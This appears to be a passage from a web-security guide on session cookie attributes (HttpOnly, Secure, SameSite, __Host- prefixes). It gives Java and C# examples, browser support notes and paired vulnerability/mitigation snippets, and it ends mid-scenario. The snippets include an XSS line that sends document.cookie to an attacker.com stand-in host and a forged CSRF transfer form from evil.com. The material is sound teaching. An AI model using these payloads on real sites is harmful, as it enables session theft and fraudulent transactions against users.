// UsagesetSecureSessionCookie(&#x27;abc123&#x27;);?&gt;</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80c4-b6ff-dd71564b8b13" class="">Java (Spring Boot)</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8087-9b5d-f2a5662f8273" class="code code-wrap"><code class="language-Java" style="white-space:pre-wrap;word-break:break-all">import org.springframework.http.ResponseCookie;import org.springframework.http.ResponseEntity;@PostMapping(&quot;/login&quot;)public ResponseEntity&lt;?&gt; login() {    String sessionToken = generateSessionToken();    ResponseCookie cookie = ResponseCookie.from(&quot;__Host-sessionId&quot;, sessionToken)        .httpOnly(true)          // No JavaScript access (XSS protection)        .secure(true)            // HTTPS only        .path(&quot;/&quot;)               // Site-wide        .sameSite(&quot;Strict&quot;)      // CSRF protection        .maxAge(Duration.ofHours(1))  // 1 hour        .build();        // Note: __Host- prefix requires no domain    return ResponseEntity.ok()        .header(HttpHeaders.SET_COOKIE, cookie.toString())        .body(Map.of(&quot;success&quot;, true));}</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8092-a681-cfb018316800" class="">C# (ASP.NET Core)</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80e7-84aa-d9a08e9362d8" class="code code-wrap"><code class="language-C#" style="white-space:pre-wrap;word-break:break-all">using Microsoft.AspNetCore.Http;public IActionResult Login(){    var sessionToken = GenerateSessionToken();    var cookieOptions = new CookieOptions
    {        HttpOnly = true,         // No JavaScript access (XSS protection)        Secure = true,           // HTTPS only        SameSite = SameSiteMode.Strict,  // CSRF protection        Path = &quot;/&quot;,              // Site-wide        MaxAge = TimeSpan.FromHours(1)   // 1 hour        // Note: __Host- prefix requires no Domain    };    Response.Cookies.Append(&quot;__Host-sessionId&quot;, sessionToken, cookieOptions);    return Ok(new { success = true });}</code></pre></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-80eb-8d36-ce41a4ff38d6"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-806b-ad2d-eb88654e8e38" class="">Browser Compatibility</h2></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8086-a287-d7239139bd9c" class="">HttpOnly Support</h3></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80a9-8498-c14f9427d64b" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>All modern browsers</strong>: Full support</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-807a-85db-dffef3b95652" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>IE 6+</strong>: Supported</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8000-8bad-f35718cf53b2" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Mobile browsers</strong>: Full support</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8070-a68f-d3b98a1a3ef4" class="">Secure Support</h3></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80ef-abfa-dc90f01f8ee0" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>All modern browsers</strong>: Full support</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80bc-9b1c-d9d4406f8741" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>IE 6+</strong>: Supported</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-801d-ac12-fb8ab4eab327" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Mobile browsers</strong>: Full support</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8010-ae2c-f03e4110fedd" class="">SameSite Support</h3></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80ba-b295-e76397102278" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Chrome 51+</strong>: Full support</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80dd-8183-d08a7d6b13bf" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Firefox 60+</strong>: Full support</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8029-ad96-e69ad1f91cf1" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Safari 12+</strong>: Full support (with some quirks in older versions)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80c4-bab7-e55a44270667" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Edge 79+</strong>: Full support</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8061-9ac7-d05d6d1f1ac4" class="bulleted-list"><li style="list-style-type:disc">⚠️ <strong>IE 11</strong>: Not supported</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8012-8209-e3ee155944b3" class="bulleted-list"><li style="list-style-type:disc">⚠️ <strong>Older browsers</strong>: Not supported (default to None behavior)</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80b7-a0d1-fc12854e9671" class="">Cookie Prefixes Support</h3></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80f4-a0bf-edaec3fe466c" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Chrome 49+</strong>: <code>__Secure-</code> and <code>__Host-</code> support</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80e5-9196-ce7f0adb40bb" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Firefox 50+</strong>: <code>__Secure-</code> and <code>__Host-</code> support</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80c5-87ff-ccbc7978c2ca" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Safari 12+</strong>: <code>__Secure-</code> and <code>__Host-</code> support</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80ad-ad8a-dad55b1a3d12" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Edge 79+</strong>: <code>__Secure-</code> and <code>__Host-</code> support</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80bf-a3c2-fc8e3ec994fa" class="bulleted-list"><li style="list-style-type:disc">⚠️ <strong>IE 11</strong>: Not supported (prefixes ignored, but cookies still work)</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-804e-98a9-fdcaa6d650e4" class="">Testing Cookie Attributes</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80c9-927d-f057b1763eb3" class=""><strong>Browser DevTools:</strong><br/>1. Open DevTools (F12)<br/>2. Go to Application/Storage tab<br/>3. Click Cookies<br/>4. View cookie attributes</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80f6-97d1-fc34437e29a6" class=""><strong>Command Line (curl):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80bc-b1fd-f8ac328c7d92" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># Check Set-Cookie headercurl -I https://example.com/login
# Check if cookie is sentcurl -v -H &quot;Cookie: sessionId=abc123&quot; https://example.com/api</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-807a-91f0-f4764981415f" class=""><strong>Online Tools:</strong><br/>- SecurityHeaders.com<br/>- Cookie-Editor browser extension<br/>- Browser DevTools Network tab</p></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-80e1-b102-c20e4b8bc91a"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-802a-8e30-d9d578d7b63e" class="">Common Vulnerabilities and Mitigations</h2></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-804c-b47b-dce1b86a5fac" class="">1. Missing HttpOnly (XSS Vulnerability)</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8034-bf99-f1c126efe85e" class=""><strong>Vulnerability:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80f2-b0a4-e6ee416efca8" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Cookie set without HttpOnlySet-Cookie: sessionId=abc123
// XSS attack&lt;script&gt;  document.location = &#x27;https://attacker.com/steal?cookie=&#x27; + document.cookie;&lt;/script&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80a5-b0e3-d77f22dfd6a6" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80e5-9cc9-d0cafa011f70" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Always use HttpOnly for sensitive cookiesSet-Cookie: sessionId=abc123; HttpOnly</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-801e-aa84-f7351d04c120" class="">2. Missing Secure (MitM Vulnerability)</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-800c-8a65-d9170e43c3d6" class=""><strong>Vulnerability:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80ad-9875-ce24a7e40fc8" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Cookie set without SecureSet-Cookie: sessionId=abc123; HttpOnly
// Attacker on same network intercepts HTTP traffic// Cookie sent in plaintext, can be stolen</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80ff-9a9a-fd693994db86" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80a1-b880-c3134ba9b87b" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Always use Secure in productionSet-Cookie: sessionId=abc123; HttpOnly; Secure</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80d3-a8d3-c6c272214e36" class="">3. Missing SameSite (CSRF Vulnerability)</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8095-8850-deaaf54f0e68" class=""><strong>Vulnerability:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8094-82e2-d91d720280c6" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Cookie set without SameSiteSet-Cookie: sessionId=abc123; HttpOnly; Secure
// CSRF attack// Attacker&#x27;s site: evil.com&lt;form action=&quot;https://bank.com/transfer&quot; method=&quot;POST&quot;&gt;  &lt;input name=&quot;to&quot; value=&quot;attacker&quot;&gt;  &lt;input name=&quot;amount&quot; value=&quot;10000&quot;&gt;&lt;/form&gt;// Cookie sent with cross-site request</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8068-b1cc-d8616ef99f63" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80c0-9e54-e5558a6fc981" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Use SameSite=Strict or LaxSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8021-8ea4-c2b00cdf30d1" class=""><strong>Note:</strong> HttpOnly does NOT prevent this CSRF attack. Only SameSite (or CSRF tokens) can prevent it.</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8083-9bf0-c96de93e1547" class="">4. Overly Broad Domain (Subdomain Attack)</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-809b-83c4-ffbfb0e5eed5" class=""><strong>Vulnerability:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80f8-a719-fba81d765d0a" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Cookie set with broad domainSet-Cookie: sessionId=abc123; Domain=.example.com// If subdomain.example.com is compromised// Attacker can access the cookie</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80a7-b1e2-d33af063ec5e" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80c2-b580-cf2ef1d7e79b" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Don&#x27;t set Domain, or use __Host- prefixSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; Path=/</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80c7-849d-f8a336e0c8ae" class="">5. Long-Lived Cookies (Session Fixation)</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8068-a297-d1fa64de8ceb" class=""><strong>Vulnerability:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80bc-9640-db2f3d37ec6f" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Cookie with very long expirationSet-Cookie: sessionId=abc123; Expires=Wed, 21 Oct 2030 07:28:00 GMT
// If stolen, remains valid for years</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8021-97c4-f67b1ee7bf7c" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80af-a565-fcf0b502176e" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Use short expiration timesSet-Cookie: sessionId=abc123; Max-Age=3600  // 1 hour// Implement server-side session rotation// Regenerate session ID periodically</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80d8-8c72-fdfd8d4c988a" class="">6. SameSite=None Without Secure</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80d4-949f-ebb1c70f9694" class=""><strong>Vulnerability:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8000-9b56-e2f5003885cc" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// SameSite=None without Secure (invalid, but some servers allow)Set-Cookie: sessionId=abc123; SameSite=None
// Modern browsers reject this, but legacy behavior may differ</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80c3-8f86-c63dcb09a821" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8052-8839-c5cb6d4aafe6" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Always use Secure with SameSite=NoneSet-Cookie: sessionId=abc123; SameSite=None; Secure</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80ec-ba04-cca3f67f5063" class="">7. Cookie Theft via Document.cookie</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-806d-b7ee-d11b398a52b1" class=""><strong>Vulnerability:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80e9-b642-ff510a5c5340" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Cookie accessible via JavaScriptSet-Cookie: sessionId=abc123  // Missing HttpOnly// Any script can access itvar cookie = document.cookie;</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80ca-ace0-e144245509b4" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-800a-b621-ebfe24149f01" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Use HttpOnlySet-Cookie: sessionId=abc123; HttpOnly
// JavaScript cannot access itconsole.log(document.cookie);  // Does not include sessionId</code></pre></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-80cd-a736-f62c5eb3bfc0"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-8000-a01c-ee8d03a7ad2f" class="">Real-World Scenarios</h2></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80ca-a235-d0223a19f1d3" class="">Scenario 1: E-Commerce Session Management</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8044-85dc-cbf78b935301" class=""><strong>Requirements:</strong><br/>- User stays logged in while browsing<br/>- Session persists across page navigations<br/>- Protection against XSS and CSRF<br/>- Good user experience</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80eb-a71d-f5ee704ab4ee" class=""><strong>Solution:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8027-b3bd-fa782916cec4" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=86400</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8037-9ca8-c51e8f73b0b3" class=""><strong>Why:</strong><br/>- <code>__Secure-</code> prefix: Enforces secure transmission<br/>- <code>Secure</code>: HTTPS only<br/>- <code>HttpOnly</code>: XSS protection<br/>- <code>SameSite=Lax</code>: CSRF protection while allowing external links<br/>- <code>Max-Age=86400</code>: 24-hour session</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-808b-8e2b-f685ba6c6877" class="">Scenario 2: Banking Application</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-800f-ad23-efad765049eb" class=""><strong>Requirements:</strong><br/>- Maximum security<br/>- No cross-site cookie transmission<br/>- User can re-authenticate if needed</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80bb-8a69-fe912d2d655a" class=""><strong>Solution:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" 